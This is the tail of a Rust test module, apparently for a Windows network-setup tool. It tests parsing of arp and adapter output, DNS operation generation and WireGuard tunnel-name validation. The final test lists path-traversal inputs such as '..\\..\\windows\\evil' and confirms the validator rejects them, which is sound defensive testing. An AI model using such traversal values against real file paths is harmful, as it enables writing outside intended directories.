    /// 回归：网关 `192.168.1.1` 绝不能命中本机地址 `192.168.1.10` 所在的行。
    ///
    /// arp 的接口表头正是「接口: <本机IP> --- 0x10」这种纯中文行；旧实现用
    /// `line.contains(gw)`，于是它被拉进 MAC 扫描 —— 装完即退就是它触发的。
    #[test]
    fn ip_token_match_rejects_prefix_hits() {
        let header = "\u{fffd}\u{fffd}: 192.168.1.10 --- 0x10";
        assert!(!super::has_ip_token(header, "192.168.1.1")); // 前缀不得命中
        assert!(super::has_ip_token(header, "192.168.1.10")); // 完整才命中

        let row = "  192.168.1.1           e8-84-c6-93-ad-eb     \u{fffd}\u{fffd}";
        assert!(super::has_ip_token(row, "192.168.1.1"));
        assert!(!super::has_ip_token(row, "192.168.1.11"));
        assert!(!super::has_ip_token(row, "192.168.1"));
        assert!(!super::has_ip_token(row, "")); // 空网关不得命中每一行
    }

    /// 端到端：网关所在行必须真的解析出 MAC（Windows `arp -a` 用短横线分隔）。
    #[test]
    fn gateway_row_yields_dash_separated_mac() {
        let row = "  192.168.1.1           e8-84-c6-93-ad-eb     \u{fffd}\u{fffd}        ";
        assert!(super::has_ip_token(row, "192.168.1.1"));
        assert_eq!(
            super::super::extract_mac(row).as_deref(),
            Some("e8-84-c6-93-ad-eb")
        );
    }

    /// 适配器行的第三段可以含 `|`：描述里出现竖线不该把这一行切成四截。
    #[test]
    fn adapter_rows_keep_the_description_intact() {
        let rows = parse_adapter_lines(
            "Wi-Fi|Up|Intel(R) Wi-Fi 6 AX201\nOffice-WG|Disconnected|WireGuard_TUN\n|Up|ghost\n",
        );
        assert_eq!(rows.len(), 2, "名字为空的行不是网卡");
        assert_eq!(rows[0], ("Wi-Fi".into(), "Up".into(), "Intel(R) Wi-Fi 6 AX201".into()));
        assert_eq!(rows[1].1, "Disconnected", "状态原样保留，判定留给调用方");
    }

    fn cfg(mode: Mode, dns: Option<&str>) -> NetworkConfig {
        NetworkConfig {
            mode,
            ip: Some("192.168.1.100".into()),
            netmask: Some("255.255.255.0".into()),
            gateway: Some("192.168.1.1".into()),
            dns: dns.map(Into::into),
            ..Default::default()
        }
    }

    /// 编辑器表达「DNS 保持不变」的方式是把 `dns` 键整个删掉，所以缺键必须一条
    /// `dnsservers` 都不产生 —— 否则「保持不变」实际上是把网卡打回 DHCP 下发。
    #[test]
    fn an_absent_dns_key_compiles_to_no_dns_operation() {
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, None)).unwrap();
        assert_eq!(
            ops,
            vec![WinOp::SetManual {
                iface: "Wi-Fi".into(),
                ip: "192.168.1.100".into(),
                mask: "255.255.255.0".into(),
                gw: "192.168.1.1".into(),
            }],
            "缺 dns 键只该下发地址本身"
        );
        assert_eq!(
            apply_ops("Wi-Fi", &cfg(Mode::Dhcp, None)).unwrap(),
            vec![WinOp::SetDhcp { iface: "Wi-Fi".into() }]
        );
    }

    /// 与上一个用例只差一个 `Some`：空串是一条真实的清空指令。
    #[test]
    fn an_empty_dns_string_still_clears_the_adapter() {
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, Some(""))).unwrap();
        assert!(ops.contains(&WinOp::SetDns {
            iface: "Wi-Fi".into(),
            servers: vec![]
        }));
        let clear = ops
            .iter()
            .find(|o| matches!(o, WinOp::SetDns { .. }))
            .unwrap()
            .render();
        assert!(
            clear.contains("source=dhcp"),
            "清空要真的下发 source=dhcp，而不是省掉这条: {}",
            clear
        );
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, Some(" 8.8.8.8 ,1.1.1.1, "))).unwrap();
        assert!(ops.contains(&WinOp::SetDns {
            iface: "Wi-Fi".into(),
            servers: vec!["8.8.8.8".into(), "1.1.1.1".into()],
        }));
    }

    /// 隧道名会拼成 `%PROGRAMDATA%\\WireGuard\\WiredTunnels\\<name>.conf`，
    /// 所以路径分隔符一个都不能放过。
    #[test]
    fn tunnel_names_carry_no_path() {
        assert!(safe_tunnel_name("Office-WG").is_ok());
        for bad in ["", "..", "..\\..\\windows\\evil", "a/b", "C:\\x", "a\0b"] {
            assert!(safe_tunnel_name(bad).is_err(), "{:?} 不该被当成隧道名", bad);
        }
    }
}
